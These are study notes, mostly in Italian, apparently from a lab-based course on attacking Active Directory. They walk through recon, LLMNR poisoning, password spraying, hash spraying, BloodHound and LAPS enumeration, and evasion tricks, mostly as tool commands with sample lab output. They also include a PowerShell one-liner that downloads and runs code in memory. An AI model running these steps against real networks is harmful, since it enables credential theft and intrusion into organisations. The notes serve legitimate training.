# Active Directory attacks

Spesso ci sono misconfiguration. Utilizzeremo molti tool e molti attacchi.

Lo scopo principale di attaccare un ambiente AD e' scalare privilegi e muoversi lateralmente o verticalmente attraverso la rete.

Dovremo diventare abituati ad enumerare sia da Windows che da Linux e usando un toolset limitato o windows built-in tools per **Living off the land**.

Nel corso molte volte i tool saranno in "C:\Tools"


# Initial Enumeration

# External Recon and Enumeration

Si puo' sempre trarre beneficio da fare una reconnaissance esterna del target.

## Cosa cercare

|Data Point|	Description|
|--|--|
IP Space	|Valid ASN for our target, netblocks in use for the organization's public-facing infrastructure, cloud presence and the hosting providers, DNS record entries, etc.|
Domain Information|	Based on IP data, DNS, and site registrations. Who administers the domain? Are there any subdomains tied to our target? Are there any publicly accessible domain services present? (Mailservers, DNS, Websites, VPN portals, etc.) Can we determine what kind of defenses are in place? (SIEM, AV, IPS/IDS in use, etc.)
Schema Format	|Can we discover the organization's email accounts, AD usernames, and even password policies? Anything that will give us information we can use to build a valid username list to test external-facing services for password spraying, credential stuffing, brute forcing, etc.
Data Disclosures|	For data disclosures we will be looking for publicly accessible files ( .pdf, .ppt, .docx, .xlsx, etc. ) for any information that helps shed light on the target. For example, any published files that contain intranet site listings, user metadata, shares, or other critical software or hardware in the environment (credentials pushed to a public GitHub repo, the internal AD username format in the metadata of a PDF, for example.)
Breach Data	Any| publicly released usernames, passwords, or other critical information that can help an attacker gain a foothold.


## Dove cercare

|Resource|	Examples|
|--|--|
ASN / IP registrars	|IANA, arin for searching the Americas, RIPE for searching in Europe, BGP Toolkit
Domain Registrars & DNS	Domaintools|, PTRArchive, ICANN, manual DNS record requests against the domain in question or against well known DNS servers, such as 8.8.8.8.
Social Media	|Searching Linkedin, Twitter, Facebook, your region's major social media sites, news articles, and any relevant info you can find about the organization.
Public-Facing Company Websites|	Often, the public website for a corporation will have relevant info embedded. News articles, embedded documents, and the "About Us" and "Contact Us" pages can also be gold mines.
Cloud & Dev Storage Spaces |	GitHub, AWS S3 buckets & Azure Blog storage containers, Google searches using "Dorks"
Breach Data Sources	|HaveIBeenPwned to determine if any corporate email accounts appear in public breach data, Dehashed to search for corporate emails with cleartext passwords or hashes we can try to crack offline. We can then try these passwords against any exposed login portals (Citrix, RDS, OWA, 0365, VPN, VMware Horizon, custom applications, etc.) that may use AD authentication.

## Trovare Address Spaces

il **BGP-Toolkit** hostato su **https://he.net/** e' molto utile per cercare quali blocchi di indirizzi sono assegnati a queli organizzazione e quali ASN.

## DNS

DNS e' un ottimo modo per trovare altri host non rilevati

Sites like domaintools, and viewdns.info are great spots to start.


## Public Data
Cerca sui social network. Offerte di lavoro

### Hunting for emails and files
`Using the dork intext:"@inlanefreight.com" inurl:inlanefreight.com,`

`Using filetype:pdf inurl:inlanefreight.com`

### Credential Hunting
**j4k1dibe@htb[/htb]$ sudo python3 dehashed.py -q inlanefreight.local -p**. Dehashed is a great tool. also with API


# Setting up

## Identifying Hosts
Possiamo usare Wireshark, TCPDump, richieste ARP, MDNS.


`└──╼ $sudo -E wireshark`
cerchiamo pacchetti **ARP, MDNS**

`j4k1dibe@htb[/htb]$ sudo tcpdump -i ens224 `

In windows e' pure builtin **pktmon.exe**

### Responder
E' un tool usato per ascoltare, analizzare e posionare LLMNR, NBT-NS e MDNS request and responses.

`sudo responder -I ens224 -A `

### FPing Active cheks
`j4k1dibe@htb[/htb]$ fping -asgq 172.16.5.0/23`, Fping e' simile a ping, ma puo' pingare piu' target perche' asincrono.

`j4k1dibe@htb[/htb]$ fping -asgq 172.16.5.0/23`
-a, alive, -s print stats, -g target list, q not show per-target results

### Nmap
`sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum`

## Identifying Users

### Keybrute- Internal AD Username Enumeration

**Kerbrute** e' un opzione stealth per fare domain account enumeration. Sfrutta il fatto che Kerberos pre-authentication failures spesso non triggerano logs o alert. Usando questo insieme a jsmith.txt/jsmith2.txt user list da **https://github.com/insidetrust/statistically-likely-usernames**


Si possono scaricare i binari precompilati da https://github.com/ropnop/kerbrute/releases/tag/v1.0.3

`j4k1dibe@htb[/htb]$ sudo git clone https://github.com/ropnop/kerbrute.git`

`j4k1dibe@htb[/htb]$ make help`, Listing compiling options

`sudo make all`, compiliamo per tutto

se vogliamo AGGIUNGIAMOLO AL PATH, oppure mettiamolo in /bin `j4k1dibe@htb[/htb]$ sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute`

### Enumerating Users with Kerbrute

`j4k1dibe@htb[/htb]$ kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users`


## Identifying Potential Vulnerabilities.

In una macchina locale **SYSTEM** ha tutti i permessi. Avere accesso a SYSTEM su un account domain-joined ci permette di enumerare la Active Directory impersonandoci come account di quel computer.



# LLMNR/NBT-NS Poisoning from Linux
LLMNR(Link-Local Multicast Name Resolution) and (NBT-NS) NetBIOS Name Service broadcasts sono protocolli che possiamo exploitare con approccio MiTM e sniffare credenziali.

Sono componenti microsoft che servono come metodi alternativi di identificazione dell' host e possono essere usate quando il DNS fallisce. Praticamente quando il DNS resolution fallisce la macchina provera' a chiedere ad altre macchine nella rete locale l'indirizzo corretto  via LLMNR. LLMNR Permette di fare host resolution .

LLMNR e' basato su DNS e usa porta 5355 UDP e NBT-NS 137 UDP.

LA VULN STA perche' Quando LLMNR e NBT-NS sono usate per name resolution  chiunque nella rete puo' rispondere. Possiamo usare **Responder** per poisonare queste richieste. Con accesso alla rete locale possiamo spoofare una authoritative name resolution source rispondendo al traffico LLMNR e NBT-NS.

Cosi' le vittime comunicheranno con noi perche' pensano che noi siamo il requested host.

![image](https://github.com/user-attachments/assets/7a426af5-12bd-4aab-93ca-f109d23cef10)


I tool per fare questo attacco sono: Responder, Inveigh e Metasploit.

### Con Responder
`sudo responder -I ens224 `, starting responder

i log di Responder sono storati in **/usr/share/responder/logs**

`j4k1dibe@htb[/htb]$ hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt`, cracking the hash with hashcat mode 5600


# LLMNR/NBT-NS Poisoning from Windows

scarica Inveigh da https://github.com/Kevin-Robertson/Inveigh


```
PS C:\htb> Import-Module .\Inveigh.ps1
PS C:\htb> (Get-Command Invoke-Inveigh).Parameters
```

`PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y`

# Enumerating Password Policies

Ci sono vari modi per retrievare le password policy del dominio. Dipende da come e' configurato.

Se abbiamo gia' delle credenziali valide possiamo enumerare con **CrackMapExec or rpcclient**

### Con CrackMapExec

`j4k1dibe@htb[/htb]$ crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol`, con crackmapexec (https://github.com/byt3bl33d3r/CrackMapExec)


### Con SMB NULL Sessions

Anche senza credenziali possiamo ottenere la password policy con SMB NULL sessions o LDAP Anonymous bind.

SMB NULL Sessions danno ad un attaccante non autenticato informazioni tipo lista completa di utenti, gruppi, computer etc.etc.

SMB NULL misconfiguration stanno spesso in legacy Domain Controller

### Con rpcclient

```
j4k1dibe@htb[/htb]$ rpcclient -U "" -N 172.16.5.5

rpcclient $> querydominfo
Domain:		INLANEFREIGHT
Server:		
Comment:	
Total Users:	3650
Total Groups:	0
Total Aliases:	37
Sequence No:	1
Force Logoff:	-1
Domain Server State:	0x1
Server Role:	ROLE_DOMAIN_PDC
Unknown 3:	0x1


rpcclient $> getdompwinfo
min_password_length: 8
password_properties: 0x00000001
	DOMAIN_PASSWORD_COMPLEX

```

### Con enum4linux
(https://labs.portcullis.co.uk/tools/enum4linux/)

`j4k1dibe@htb[/htb]$ enum4linux -P 172.16.5.5`

`j4k1dibe@htb[/htb]$ enum4linux-ng -P 172.16.5.5 -oA ilfreight`, formato json
`j4k1dibe@htb[/htb]$ cat ilfreight.json `

## Enumerating null sessions from Windows
```
C:\htb> net use \\DC01\ipc$ "" /u:""
The command completed successfully.
```


 Quando lo facciamo potrebbero occorrere alcuni errori: **Account disabled, Password incorrect, Account locked out**


## LDAP Anonymous Bind , enumeriamo password policy da Linux
(https://linux.die.net/man/1/ldapsearch)

`j4k1dibe@htb[/htb]$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength`

## Enumerare password policy da Windows
` Enumerating & Retrieving Password Policies

C:\htb> net accounts

Force user logoff how long after time expires?:       Never
Minimum password age (days):                          1
Maximum password age (days):                          Unlimited
Minimum password length:                              8
Length of password history maintained:                24
Lockout threshold:                                    5
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        SERVER
The command completed successfully.
`

### Usando Powerview
```
PS C:\htb> import-module .\PowerView.ps1
PS C:\htb> Get-DomainPolicy

Unicode        : @{Unicode=yes}
SystemAccess   : @{MinimumPasswordAge=1; MaximumPasswordAge=-1; MinimumPasswordLength=8; PasswordComplexity=1;
                 PasswordHistorySize=24; LockoutBadCount=5; ResetLockoutCount=30; LockoutDuration=30;
                 RequireLogonToChangePassword=0; ForceLogoffWhenHourExpire=0; ClearTextPassword=0;
                 LSAAnonymousNameLookup=0}
KerberosPolicy : @{MaxTicketAge=10; MaxRenewAge=7; MaxServiceAge=600; MaxClockSkew=5; TicketValidateClient=1}
Version        : @{signature="$CHICAGO$"; Revision=1}
RegistryValues : @{MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=System.Object[]}
Path           : \\INLANEFREIGHT.LOCAL\sysvol\INLANEFREIGHT.LOCAL\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHI
                 NE\Microsoft\Windows NT\SecEdit\GptTmpl.inf
GPOName        : {31B2F340-016D-11D2-945F-00C04FB984F9}
GPODisplayName : Default Domain Policy

```

**BISOGNA FARE ATTENZIONE A NON BLOCCARE GLI ACCOUNT. MOLTO SPESSO HANNO UN LIMITE DI BLOCCO BASSO**


# Password Spraying -  Making a target User List

Per fare uno spray attack dovremo prima enumerare utenti e avere una lista

### Enumerare tutti gli utenti usando enum4linux (piu' pulito) (SMB NULL)
`j4k1dibe@htb[/htb]$ enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"`

### Usando rpcclient (SMB NULL)
`j4k1dibe@htb[/htb]$ rpcclient -U "" -N 172.16.5.5`

### USando CrackMapExec (SMB NULL)
`j4k1dibe@htb[/htb]$ crackmapexec smb 172.16.5.5 --users`

### Usando ldapsearch (LDAP Anonymous BIND)
`j4k1dibe@htb[/htb]$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "`

### Usando windapsearch (LDAP Anon)


### Usando kerbrute (si brute forza e si trovano nomi utente)
`j4k1dibe@htb[/htb]$  kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt `


# Internal Password Spraying from Linux

### Bash one liner
`for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done`

### Con kerbrute
`j4k1dibe@htb[/htb]$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1`


## Enumerazione autenticata

### Con CrackMapExec
`j4k1dibe@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users`

### Usando CrackMapExec e filtrando Logon failures
`j4k1dibe@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +`

### Validiamo le credenziali trovtec on crackkmapexec
`j4k1dibe@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123`, Validiamo le credenziali

## Local Admin password reuse

Se riusciamo ad ottenere una password di un Admin locale Molto spesso lui usera' la stessa password pure sugli altri computer, identica.

If we find a desktop host with the local administrator account password set to something unique such as $desktop%@admin123, it might be worth attempting $server%@admin123 against servers

### Local Admin Spraying con crackmapexec
`j4k1dibe@htb[/htb]$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +`

la flag **--local-auth** specifica di provare il login solo una volta per macchina. Questo e' MOLTO IMPORTANTE.



# Internal password spraying from Windows
scarica  https://github.com/dafthack/DomainPasswordSpray

### Usare DomainPasswordSpray
```
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```


# Enumerating Security Controls

## Windows defender

`PS C:\htb> Get-MpComputerStatus`

il parametro **RealTimeProtectionEnabled**, se e' settato a true la protezione e' abilitata


## AppLocker

AppLocker e' un application whitelist. Praticamente una lista dei software approvati che possono eseguire su un sistema. Spesso i sysadmin si mettono pure a bloccare roba tipo **cmd.exe** o **powershell.exe**.

`PS C:\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`, enumera le policy di applocker

## PoweShell constrained language mode
E' una modalita' che blocca molte feature di powershell 

`PS C:\htb> $ExecutionContext.SessionState.LanguageMode`, per vedere se e' attiva

## LAPS

LAPS (Local Administrator Password Solution) E' usata per randomizzare e ruotare le password degli amministratori locali su windows e prevenire lateral movement.

Possiamo enumerare quale domain user puo' leggere le LAPS password per le macchine. il **LAPSToolkit** facilita molto. un modo e' parsare **ExtendedRights** per tutti i computer  enables.

```
PS C:\htb> Find-LAPSDelegatedGroups

OrgUnit                                             Delegated Groups
-------                                             ----------------
OU=Servers,DC=INLANEFREIGHT,DC=LOCAL                INLANEFREIGHT\Domain Admins
OU=Servers,DC=INLANEFREIGHT,DC=LOCAL                INLANEFREIGHT\LAPS Admins
OU=Workstations,DC=INLANEFREIGHT,DC=LOCAL           INLANEFREIGHT\Domain Admins
OU=Workstations,DC=INLANEFREIGHT,DC=LOCAL           INLANEFREIGHT\LAPS Admins
OU=Web Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\Domain Admins
OU=Web Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\LAPS Admins
OU=SQL Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\Domain Admins
OU=SQL Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\LAPS Admins
OU=File Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\Domain Admins
OU=File Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\LAPS Admins
OU=Contractor Laptops,OU=Workstations,DC=INLANEF... INLANEFREIGHT\Domain Admins
OU=Contractor Laptops,OU=Workstations,DC=INLANEF... INLANEFREIGHT\LAPS Admins
OU=Staff Workstations,OU=Workstations,DC=INLANEF... INLANEFREIGHT\Domain Admins
OU=Staff Workstations,OU=Workstations,DC=INLANEF... INLANEFREIGHT\LAPS Admins
OU=Executive Workstations,OU=Workstations,DC=INL... INLANEFREIGHT\Domain Admins
OU=Executive Workstations,OU=Workstations,DC=INL... INLANEFREIGHT\LAPS Admins
OU=Mail Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\Domain Admins
OU=Mail Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\LAPS Admins
```

il check **Find-AdmPwdExtendedRights** controlla i diritti su ogni computer  con LAPS abilitato per ogni gruppo.

The Find-AdmPwdExtendedRights checks the rights on each computer with LAPS enabled for any groups with read access and users with "All Extended Rights." Users with "All Extended Rights" can read LAPS passwords and may be less protected than users in delegated groups, so this is worth checking for.

```
PS C:\htb> Find-AdmPwdExtendedRights

ComputerName                Identity                    Reason
------------                --------                    ------
EXCHG01.INLANEFREIGHT.LOCAL INLANEFREIGHT\Domain Admins Delegated
EXCHG01.INLANEFREIGHT.LOCAL INLANEFREIGHT\LAPS Admins   Delegated
SQL01.INLANEFREIGHT.LOCAL   INLANEFREIGHT\Domain Admins Delegated
SQL01.INLANEFREIGHT.LOCAL   INLANEFREIGHT\LAPS Admins   Delegated
WS01.INLANEFREIGHT.LOCAL    INLANEFREIGHT\Domain Admins Delegated
WS01.INLANEFREIGHT.LOCAL    INLANEFREIGHT\LAPS Admins   Delegated

```

We can use the Get-LAPSComputers function to search for computers that have LAPS enabled when passwords expire, and even the randomized passwords in cleartext if our user has access.

```
PS C:\htb> Get-LAPSComputers

ComputerName                Password       Expiration
------------                --------       ----------
DC01.INLANEFREIGHT.LOCAL    6DZ[+A/[]19d$F 08/26/2020 23:29:45
EXCHG01.INLANEFREIGHT.LOCAL oj+2A+[hHMMtj, 09/26/2020 00:51:30
SQL01.INLANEFREIGHT.LOCAL   9G#f;p41dcAe,s 09/26/2020 00:30:09
WS01.INLANEFREIGHT.LOCAL    TCaG-F)3No;l8C 09/26/2020 00:46:04
```

# Credential Enumeration from Linux

### CrackMapExec Domain User enumeration (authenticated)

`j4k1dibe@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users`

### CrackMapExec Domain Group Enumeration
`j4k1dibe@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups`

### CME Logged on users
`j4k1dibe@htb[/htb]$ sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users`

 We can also see that our user forend is a local admin because (Pwn3d!) 

### CME Share enumeration

`j4k1dibe@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares`

### Spider_plus
questa mode semlpicemente va a enumerare i file contenuti nelle share readables e outputta in un bel JSON (j4k1dibe@htb[/htb]$ head -n 10 /tmp/cme_spider_plus/172.16.5.5.json )

`j4k1dibe@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'`

### SMBMap check access

`j4k1dibe@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5`

### SMBMap ricorsivo per listare tutte directories
`j4k1dibe@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only`


### Rpcclient 
`rpcclient -U "" -N 172.16.5.5`, con NULL session

### RPCclient enumeration

Con RPCclient notiamo un field chiamato **rid** (Relative Identifier) un identificatore univoc rappresentato in hex che windows usa per identificare gli ogetti

![image](https://github.com/user-attachments/assets/6c616f05-5b87-4d3b-ad77-c1fad86cd164)


```
rpcclient $> enumdomusers # questo enumera i rid

rpcclient $> queryuser 0x457

        User Name   :   htb-student
        Full Name   :   Htb Student
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Wed, 02 Mar 2022 15:34:32 EST
        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST
        Kickoff Time             :      Wed, 13 Sep 30828 22:48:05 EDT
        Password last set Time   :      Wed, 27 Oct 2021 12:26:52 EDT
        Password can change Time :      Thu, 28 Oct 2021 12:26:52 EDT
        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT
        unknown_2[0..31]...
        user_rid :      0x457
        group_rid:      0x201
        acb_info :      0x00000010
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x0000001d
        padding1[0..7]...
        logon_hrs[0..21]...
```

## Impacket Toolkit

impacket ha un botto di roba

## psexec.py

Se abbiamo un utente con local admin privs possiamo semplicemente loggarci e aprire una shell con psexec.py, funziona uploadando una roba nelle share

## con wmiexec.py
`wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  `

`psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125  `

### Enumerate domain admins con windapsearch
`j4k1dibe@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da`

### Enumrate privileged users
`j4k1dibe@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU`

## BloodHound
Bloodhound e' il tool piu' peso per AD. Rappresenta tutto in grafichi e ha pure una GUI. Raccoglie una marea di dati. Pero' deve essere runnato da autenticati ovviamente

`j4k1dibe@htb[/htb]$ sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all `

I risultati sono tutti i json

### Uploeading zip to BloodHound GUI

Se vogliamo possiamo zippare tutti gli output json con `zip -r ilfreight_bh.zip *.json` e carichiamo lo zip sulla GUI

La gui ci fa vedre grafici, ossiamo vedere roba tipo lo shortest oath per il domain admin. Ci da path logici tramite utenti, gruppi, host etc,etc, e tutte le varie relazioni che ci possono aiutare a scalare fino a domain admin.

# Credentialed Enumeration from Windows

ActiveDirectory PowerShell module.  (https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps) e' una toolsuite di powershell cmdlets fatti per gli admin di AD.

### Discover modules insalled
`PS C:\htb> Get-Module`

### Loead ActiveDirectory Module
```
PS C:\htb> Import-Module ActiveDirectory
PS C:\htb> Get-Module

ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Manifest   1.0.1.0    ActiveDirectory                     {Add-ADCentralAccessPolicyMember, Add-ADComputerServiceAcc...
Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}
Script     2.0.0      PSReadline  
```

### Get Domain info
`PS C:\htb> Get-ADDomain`

### Get AD USers
`PS C:\htb> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName`

### Checking for Trust Replationships
domain trust relationships
`PS C:\htb> Get-ADTrust -Filter *`

### Group Enumeration
`PS C:\htb> Get-ADGroup -Filter * | select name`

### Detailed group info
`PS C:\htb> Get-ADGroup -Identity "Backup Operators"`

### Group membership
`PS C:\htb> Get-ADGroupMember -Identity "Backup Operators"`

## PowerView
e' un tool powerhsell tipo BloodHound che ci da un sacco di info

### Domain User information, Info su un utente
`PS C:\htb> Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol`

### Recursive group membership
`PS C:\htb>  Get-DomainGroupMember -Identity "Domain Admins" -Recurse`

### Trust enumeration
`PS C:\htb> Get-DomainTrustMapping`

### Testing local admin access
`PS C:\htb> Test-AdminAccess -ComputerName ACADEMY-EA-MS01`

### Trovare utenti con SPN Set

`PS C:\htb> Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName`


## SharpView

PowerView e' in parte deprecato.  ora si usa piu' SharpView
### Enum un utente con sharpview
`PS C:\htb> .\SharpView.exe Get-DomainUser -Identity forend`

## Shaffler

**Shaffler** e' un tool che ci aiuta ad acquisire credenziali e altri dati sensibili in AD. Funziona ottenendo una lista di host nel dominio ed enumerando questi host per share e directory leggibili

`Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data`

## SharpHound
`PS C:\htb> .\SharpHound.exe -c All --zipfilename ILFREIGHT`

Zopo lo zip lo trasferiamo alla nostra GUI

### Unsupported Operating Systems
Cercare computer con **Unsupported Operating Systems** e' utlissimo perche' ci mostra computer vecchi e possibilmente vulnerabili a CVE vecchie

### Local Admins
Spesso ci sono tanti local admins non necessari, cerchiamoli su bloodhound



This query shows two hosts, one running Windows 7 and one running Windows Server 2008 (both of which are not "live" in our lab). Sometimes we will see hosts that are no longer powered on but still appear as records in AD. We should always validate whether they are "live" or not before making recommendations in our reports. We may write up a high-risk finding for Legacy Operating Systems or a best practice recommendation for cleaning up old records in AD.


# Living Off The Land

## Basic Enumeration Commands

| Command                                       | Result                                                 |
|-----------------------------------------------|--------------------------------------------------------|
| `hostname`                                    | Prints the PC's Name                                  |
| `[System.Environment]::OSVersion.Version`     | Prints out the OS version and revision level         |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patches and hotfixes applied to the host |
| `ipconfig /all`                               | Prints out network adapter state and configurations  |
| `set`                                         | Displays a list of environment variables for the current session (ran from CMD-prompt) |
| `echo %USERDOMAIN%`                           | Displays the domain name to which the host belongs (ran from CMD-prompt) |
| `echo %logonserver%`                          | Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt) |


### Systeminfo
`systeminfo`, ritorna parecchie informazioni, utili ad esempio per trovare CVE


## With Powershell

## PowerShell Enumeration Commands

| Cmd-Let | Description |
|---------|------------|
| `Get-Module` | Lists available modules loaded for use. |
| `Get-ExecutionPolicy -List` | Prints the execution policy settings for each scope on a host. |
| `Set-ExecutionPolicy Bypass -Scope Process` | Changes the policy for the current process using the `-Scope` parameter. This reverts once the process terminates, avoiding permanent changes to the victim host. |
| `Get-ChildItem Env: | ft Key,Value` | Returns environment values such as key paths, users, computer information, etc. |
| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` | Retrieves the specified user's PowerShell history, which may contain passwords or useful configuration details. |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"` | A quick method to download and execute a file from the web directly in memory. |

## DownGrade Powershell

spesso esistono piu' versioni di powershell sullo stesso host e magari l'admin non lo sapeva. Puo' tornare utile per ragioni di stealth. Tra l'altro Powershell versioni dopo la 3 ha inserito event logging. Percio' la versione 2 e' molto piu' stealth.

`PS C:\htb> powershell.exe -version 2`, downgrade a powershell v2


### Check Defenses

### Check pdel firewall
`PS C:\htb> netsh advfirewall show allprofiles`

### Check di windows defender dal cmd.exe
`C:\htb> sc query windefend`

### Check di defender da powershell
`PS C:\htb> Get-MpComputerStatus`


### Enum logged on
utile perche' magari potremmo causare sospetti se c'e' anche qualcun altro loggato
`PS C:\htb> qwinsta`


### Network Information

| Networking Commands | Description |
|--------------------|-------------|
| `arp -a` | Lists all known hosts stored in the ARP table. |
| `ipconfig /all` | Prints out adapter settings for the host. Helps determine the network segment. |
| `route print` | Displays the routing table (IPv4 & IPv6), identifying known networks and shared layer three routes. |
| `netsh advfirewall show allprofiles` | Displays the status of the host's firewall, indicating if it is active and filtering traffic. |


## Windows Managemen Instrumentation (WMI)
E; uno scripting engine molto usato in Windows enterprise environments

### Quick WMI Checks

| Command | Description |
|---------|-------------|
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patch level and description of the Hotfixes applied. |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Displays basic host information, including attributes within the list. |
| `wmic process list /format:list` | Lists all processes running on the host. |
| `wmic ntdomain list /format:list` | Displays information about the Domain and Domain Controllers. |
| `wmic useraccount list /format:list` | Displays information about all local accounts and any domain accounts that have logged into the device. |
| `wmic group list /format:list` | Provides information about all local groups. |
| `wmic sysaccount list /format:list` | Dumps information about any system accounts being used as service accounts. |


## Net Commands

Il comando net e' molto utile per enumerare un sacco di cose. Pero' net.exe e' molto spesso monitorato da quegli infami degli EDR


## Table of Useful Net Commands

| Command | Description |
|---------|-------------|
| `net accounts` | Information about password requirements. |
| `net accounts /domain` | Displays password and lockout policy. |
| `net group /domain` | Information about domain groups. |
| `net group "Domain Admins" /domain` | Lists users with domain admin privileges. |
| `net group "domain computers" /domain` | Lists PCs connected to the domain. |
| `net group "Domain Controllers" /domain` | Lists PC accounts of domain controllers. |
| `net group <domain_group_name> /domain` | Displays users that belong to the specified group. |
| `net groups /domain` | Lists all domain groups. |
| `net localgroup` | Displays all available groups. |
| `net localgroup administrators /domain` | Lists users in the administrators group inside the domain (includes "Domain Admins" by default). |
| `net localgroup Administrators` | Displays information about the "Administrators" group. |
| `net localgroup administrators [username] /add` | Adds a user to the administrators group. |
| `net share` | Checks current shared folders. |
| `net user <ACCOUNT_NAME> /domain` | Retrieves information about a user within the domain. |
| `net user /domain` | Lists all users of the domain. |
| `net user %username%` | Displays information about the current user. |
| `net use x: \\computer\share` | Mounts the specified share locally. |
| `net view` | Gets a list of computers in the network. |
| `net view /all /domain[:domainname]` | Displays all shares on the domain. |
| `net view \\computer /ALL` | Lists shares of a specific computer. |
| `net view /domain` | Lists all PCs in the domain. |

### Net1 trick
Se pensi che gli EDR/defender ti srta monitorando puoi provare a usare **net1** che e' identico, potenzialmente bypassando quel check,


## DSQuery
E' un command line tool utilizzato per trovare oggetti in un AD. Le query sono tipo quelle di BloodHound o PowerView ed e' preinstallato in tutti i sistemi windows.

### User search
`PS C:\htb> dsquery user`

### COmputer search
`PS C:\htb> dsquery computer`

### Wildcard search
`PS C:\htb> dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"`

### User con Set di attributi specifico ((PASSWD_NOTREQD))
`PS C:\htb> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl`


### Searching Domain Controllers
`PS C:\Users\forend.INLANEFREIGHT> dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName`

## LDAP Filtering explained
incontriamo spesso stringhe del genere: **userAccountControl:1.2.840.113556.1.4.803:=8192.**. Significa che stiamo cercando nel UAC per un OID.


La prima parte **userAccountControl:1.2.840.113556.1.4.803:** indica che stiamo cercando dell' UAC invece **=8192** e' l' OID che stiamo cercando.


## OID match strings

OIDs are rules used to match bit values with attributes, as seen above. For LDAP and AD, there are three main matching rules:

    1.2.840.113556.1.4.803

When using this rule as we did in the example above, we are saying the bit value must match completely to meet the search requirements. Great for matching a singular attribute.

    1.2.840.113556.1.4.804

When using this rule, we are saying that we want our results to show any attribute match if any bit in the chain matches. This works in the case of an object having multiple attributes set.

    1.2.840.113556.1.4.1941

